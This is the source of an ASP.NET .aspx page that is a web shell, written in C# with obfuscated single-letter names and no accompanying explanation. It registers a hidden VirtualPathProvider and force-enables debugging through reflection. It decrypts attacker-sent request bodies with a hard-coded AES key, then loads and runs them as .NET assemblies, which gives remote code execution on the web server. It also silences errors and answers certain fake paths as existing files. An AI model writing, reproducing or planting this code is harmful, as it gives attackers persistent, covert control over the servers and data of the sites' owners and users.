<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Web.Hosting" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web" %>

<script runat="server" language="c#">
public void Page_Load() {
    var a = typeof(System.Web.Compilation.BuildManager);
    var b = a.GetProperty("DebuggingEnabled", BindingFlags.Static | BindingFlags.NonPublic);
    if (b != null) { try { b.SetValue(null, true); } catch { } }
    HostingEnvironment.RegisterVirtualPathProvider(new c());
}

public class c : VirtualPathProvider {
    public override string GetCacheKey(string d) {
        try {
            HttpContext e = HttpContext.Current;
            if (e != null && e.Request.Cookies.Count > 0) {
                Stream f = e.Request.InputStream;
                if (f.Length > 0) {
                    f.Position = 0;
                    byte[] g = new byte[f.Length];
                    f.Read(g, 0, g.Length);
                    byte[] h = new byte[] { 99, 97, 54, 51, 52, 53, 55, 53, 51, 56, 98, 57, 98, 49, 101, 48 };
                    var i = new RijndaelManaged();
                    i.KeySize = 128;
                    i.Key = h;
                    i.IV = h;
                    i.Mode = CipherMode.CBC;
                    i.Padding = PaddingMode.PKCS7;
                    ICryptoTransform j = i.CreateDecryptor(i.Key, i.IV);
                    byte[] k;
                    using (MemoryStream l = new MemoryStream(g))
                    using (CryptoStream m = new CryptoStream(l, j, CryptoStreamMode.Read))
                    using (MemoryStream n = new MemoryStream()) {
                        m.CopyTo(n);
                        k = n.ToArray();
                    }
                    Assembly o = Assembly.Load(k);
                    if (o != null) {
                        object p = o.CreateInstance(Encoding.ASCII.GetString(new byte[] { 75 }));
                        if (p != null) p.Equals(e);
                    }
                    e.Response.End();
                }
            }
        } catch {}
        return Previous.GetCacheKey(d);
    }
    public override bool FileExists(string d) { if (d.Length > 2 && d[1] == 'x') return true; return Previous.FileExists(d); }
    public override VirtualFile GetFile(string d) { if (d.Length > 2 && d[1] == 'x') return new aa(d); return Previous.GetFile(d); }
}

public class aa : VirtualFile {
    private string ab;
    public aa(string d) : base(d) { ab = d; }
    public override Stream Open() { return new MemoryStream(); }
}
</script>